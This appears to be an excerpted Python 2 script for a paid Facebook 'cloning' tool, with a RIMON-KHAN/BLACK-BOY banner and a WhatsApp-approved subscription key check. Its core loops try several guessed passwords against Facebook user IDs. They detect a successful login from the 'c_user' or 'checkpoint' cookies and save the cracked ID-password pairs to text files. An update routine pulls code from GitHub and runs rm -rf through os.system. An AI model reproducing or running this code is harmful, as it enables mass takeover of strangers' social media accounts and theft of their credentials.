...
logo = "\n\x1b[1;92m$$$$$$$\  $$$$$$\ $$\      $$\  $$$$$$\  $$\   $$\ \n\x1b[1;92m$$  __$$\ \_$$  _|$$$\    $$$ |$$  __$$\ $$$\  $$ |\n\x1b[1;92m$$ |  $$ |  $$ |  $$$$\  $$$$ |$$ /  $$ |$$$$\ $$ |\n\x1b[1;92m$$$$$$$  |  $$ |  $$\$$\$$ $$ |$$ |  $$ |$$ $$\$$ |\n\x1b[1;92m$$  __$$<   $$ |  $$ \$$$  $$ |$$ |  $$ |$$ \$$$$ |\n\x1b[1;92m$$ |  $$ |  $$ |  $$ |\$  /$$ |$$ |  $$ |$$ |\$$$ |\n\x1b[1;92m$$ |  $$ |$$$$$$\ $$ | \_/ $$ | $$$$$$  |$$ | \$$ |\n\x1b[1;92m\__|  \__|\______|\__|     \__| \______/ \__|  \__|\n\t\n\x1b[1;97m   Author      :     RIMON-KHAN \n\x1b[1;97m   Github      :     BLACK-BOY  \n\x1b[1;97m   FB ID       :     BLACK-BOY \n\x1b[1;97m   TOOL TYPE   :     PAID COMMANDS\n\x1b[1;97m   WAP NUMBER  :     +*********         \n\x1b[1;92m      \n"
dec = '2'
server = '2'
...
def main_apv():
    ...
    print logo
    try:
        key1 = open('/sdcard/server.txt', 'r').read()
    except IOError:
        os.system('clear')
        print logo
        print '           You dont have subscrption'
        print '           Hello Dear Ya Cammonds Paid Ha Or'
        print '           Ap Ke Subscription Nhi Ha Please Ap'
        print '           Admin Sa approved Kro Thanks'
        print '           Subscription Kelya Enter Press Kro'
        print '           Or Whatsapp Pa knock Dena Thanks'
        print ''
        myid = uuid.uuid4().hex[:10]
        print '         YOUR KEY : ' + myid + imt
        kok = open('/sdcard/server.txt', 'w')
        kok.write(myid + imt)
        kok.close()
        print ''
    ...
    if key1 in r1:
        ...
        print '           Admin Sa Approved Kro Thanks'
        print '           Subscription Kelya Enter Press Kro'
        print '           Or Whatsapp Knock Dena Thanks'
        print ''
        print '            YOUR KEY : ' + key1
        print '            Abmin (Approve)=Your Key'
        print '           Ya Uper Wale Ap Ke KEY Ha'
        print '           Copy Kar Ka WhatsApp Pa Bhaj Dena'
        print ''
        print ''
...
def main_system():
    ...
    print ''
    print 39 * '~'
    print '\x1b[1;96m[1]   Public Cloning'
    print '\x1b[1;92m[2]   Random Cloning'
    print '\x1b[1;96m[3]   File Cloning'
    print '\x1b[1;92m[4]   File Making Menu'
    print '\x1b[1;96m[5]   Check Subscription '
    print '\x1b[1;92m[6]   Update Tools'
    print '\x1b[1;96m[7]   For Any Help Massage WhatsApp'
    print 43 * '~'
    print '\x1b[1;96m[*] \x1b[1;95mAny Help Type 7 And Massage Me  \x1b[1;92mWhatsApp '
    print 43 * '~'
    main_input()
...
def main_input():
    ...
    if mx == '1':
        print ''
        print '\x1b[1;96m Cheking Subscription ....\x1b[1;92m'
        time.sleep(3)
        fb_menu()
    elif mx == '2':
        print ''
        print '\x1b[1;96m Cheking Subscription ....\x1b[1;97m'
        time.sleep(3)
        numcloning()
    elif mx == '3':
        print ''
        ...
        print '        Member In RIMON Paid Commands '
        print '        ENJOY  KRO BHI LOGO '
        time.sleep(3.5)
        main_system()
    elif mx == '6':
        os.system('git clone https://github.com/Black-Boy26/RK-V1/')
        os.system('rm -rf RIMON')
        os.system('cp -f RK-V1/RK-V1 \\.')
        os.system('rm -rf RK-V1')
        time.sleep(5)
    ...
    def main(arg):
        ...
        try:
            ...
            if 'c_user' in rana.cookies.get_dict().keys():
                print '\x1b[1;92m[RIMON-OK] ' + coc + user + ' | ' + pass1
                ok = open('RIMON-ok.txt', 'a')
                ok.write(cid + ' | ' + pass1 + '\n')
                ok.close()
                oks.append(cid + pass1)
            elif 'checkpoint' in rana.cookies.get_dict().keys():
                print '\x1b[1;91m[RIMON-CP] ' + coc + user + ' | ' + pass1
                cp = open('RIMON random-cp.txt', 'a')
                cp.write(cid + ' | ' + pass1 + '\n')
                cp.close()
...
def fb_menu():
    ...
    print ''
    print 39 * '-'
    print '\x1b[1;92m[1] Public Cloning  [RIMONPro]'
    print '\x1b[1;92m[2] Public Cloning  [RIMONFast]'
    print '\x1b[1;91m[0] Back '
    print 39 * '-'
    cz = raw_input('[!] Select : ')
    if cz == '1':
        print ''
        print '\x1b[1;91m      [ Public Cloning RIMON_Pro ]'
        print ''
        ...
        print ''
        print '\x1b[1;92m      [ Public Cloning RIMON_Fast ]'
        print ''
...
def xokpauto():
    ...
    def main(arg):
        ...
        try:
            ...
            if 'c_user' in rana.cookies.get_dict().keys():
                print '\x1b[1;92m[RIMON-OK] ' + uid + ' | ' + pass1
                ok = open('Subha-ok.txt', 'a')
                ok.write(uid + ' | ' + pass1 + '\n')
                ok.close()
                oks.append(uid + pass1)
            elif 'checkpoint' in rana.cookies.get_dict().keys():
                print '\x1b[1;97m[RIMON-CP] ' + uid + ' | ' + pass1
                cp = open('RIMON-cp.txt', 'a')
                cp.write(uid + ' | ' + pass1 + '\n')
                cp.close()
                ...
                if 'c_user' in rana.cookies.get_dict().keys():
                    print '\x1b[1;92m[RIMON-OK] ' + uid + ' | ' + pass2
                    ok = open('RIMON-ok.txt', 'a')
                    ok.write(uid + ' | ' + pass2 + '\n')
                    ok.close()
                    oks.append(uid + pass2)
                elif 'checkpoint' in rana.cookies.get_dict().keys():
                    print '\x1b[1;97m[RIMON-CP] ' + uid + ' | ' + pass2
                    cp = open('RIMON-cp.txt', 'a')
                    cp.write(uid + ' | ' + pass2 + '\n')
                    cp.close()
                    ...
                    if 'c_user' in rana.cookies.get_dict().keys():
                        print '\x1b[1;92m[RIMON-OK] ' + uid + ' | ' + pass3
                        ok = open('RIMON-ok.txt', 'a')
                        ok.write(uid + ' | ' + pass3 + '\n')
                        ok.close()
                        oks.append(uid + pass3)
                    elif 'checkpoint' in rana.cookies.get_dict().keys():
                        print '\x1b[1;97m[RIMON-CP] ' + uid + ' | ' + pass3
                        cp = open('RIMON-cp.txt', 'a')
                        cp.write(uid + ' | ' + pass3 + '\n')
                        cp.close()
                        ...
                        if 'c_user' in rana.cookies.get_dict().keys():
                            print '\x1b[1;92m[RIMON-OK] ' + uid + ' | ' + pass4
                            ok = open('RIMON-ok.txt', 'a')
                            ok.write(uid + ' | ' + pass4 + '\n')
                            ok.close()
                            oks.append(uid + pass4)
                        elif 'checkpoint' in rana.cookies.get_dict().keys():
                            print '\x1b[1;97m[RIMON-CP] ' + uid + ' | ' + pass4
                            cp = open('RIMON-cp.txt', 'a')
                            cp.write(uid + ' | ' + pass4 + '\n')
                            cp.close()
                            ...
                            if 'c_user' in rana.cookies.get_dict().keys():
                                print '\x1b[1;92m[RIMON-OK] ' + uid + ' | ' + pass5
                                ok = open('RIMON-ok.txt', 'a')
                                ok.write(uid + ' | ' + pass5 + '\n')
                                ok.close()
                                oks.append(uid + pass5)
                            elif 'checkpoint' in rana.cookies.get_dict().keys():
                                print '\x1b[1;97m[RIMON-CP] ' + uid + ' | ' + pass5
                                cp = open('RIMON-cp.txt', 'a')
                                cp.write(uid + ' | ' + pass5 + '\n')
                                cp.close()
                    ...
                    if 'c_user' in rana.cookies.get_dict().keys():
                        ...
                        if 'c_user' in rana.cookies.get_dict().keys():
                            ...
                            if 'c_user' in rana.cookies.get_dict().keys():
                                ...
                                if 'c_user' in rana.cookies.get_dict().keys():
                                    print '\x1b[1;92m[RIMON-OK] ' + uid + ' | ' + pass6
                                    ok = open('RIMON-ok.txt', 'a')
                                    ok.write(uid + ' | ' + pass6 + '\n')
                                    ok.close()
                                    oks.append(uid + pass6)
                                elif 'checkpoint' in rana.cookies.get_dict().keys():
                                    print '\x1b[1;97m[RIMON-CP] ' + uid + ' | ' + pass6
                                    cp = open('RIMON-cp.txt', 'a')
                                    cp.write(uid + ' | ' + pass6 + '\n')
                                    cp.close()
